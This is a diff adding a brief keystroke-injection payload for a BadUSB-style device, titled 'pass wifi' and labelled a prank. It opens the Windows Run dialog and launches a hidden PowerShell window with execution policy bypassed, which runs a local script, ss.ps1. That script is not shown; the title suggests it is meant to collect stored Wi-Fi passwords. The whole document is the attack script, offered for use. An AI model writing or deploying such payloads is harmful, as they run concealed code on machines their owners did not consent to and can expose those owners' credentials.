@@ -1,0 +1,13 @@
+REM	=============================================================================================================
+REM 	Title: pass wifi
+REM 	Author: Mr.Cricket
+REM 	Description: xxx
+REM 	Target: Windows 10
+REM 	Category: Prank
+REM	You can change the delay when the windows to minimize, 1 Second = 1000 Milliseconds. Change on "dd.ps1"
+REM	==============================================================================================================
+DELAY 5000
+GUI r
+DELAY 200
+STRING powershell -w h -NoP -NonI -ep Bypass D:\ss.ps1
+ENTER
